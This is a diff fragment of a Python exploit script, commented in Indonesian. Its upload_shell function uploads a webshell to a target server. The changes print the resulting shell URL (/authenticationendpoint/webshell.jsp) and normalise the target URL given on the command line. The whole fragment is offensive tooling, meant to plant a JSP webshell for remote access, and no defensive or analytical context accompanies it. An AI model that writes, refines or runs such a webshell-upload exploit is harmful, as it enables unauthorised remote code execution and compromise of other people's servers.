@@ -44,8 +44,9 @@ def upload_shell(target_url, shell_filename):
         
         # Menampilkan hasil request
         if response.status_code == 200:
-            print(f"[+] Webshell berhasil diupload ke {target_url}")
-            print("Response:", response.text)
+            shell_url = f"{target_url}/authenticationendpoint/webshell.jsp"
+            print(f"[+] Webshell berhasil diunggah!")
+            print(f"[+] Akses shell di: {shell_url}")
         else:
             print(f"[-] Upload gagal. Status code: {response.status_code}")
     except requests.exceptions.RequestException as e:
@@ -57,7 +58,7 @@ if len(sys.argv) != 3:
     sys.exit(1)
 
 # Menangkap parameter dari baris perintah
-target_url = sys.argv[1]
+target_url = sys.argv[1].rstrip("/")  # Menghapus '/' jika ada di akhir
 shell_filename = sys.argv[2]
 
 # Memanggil fungsi eksploitasi
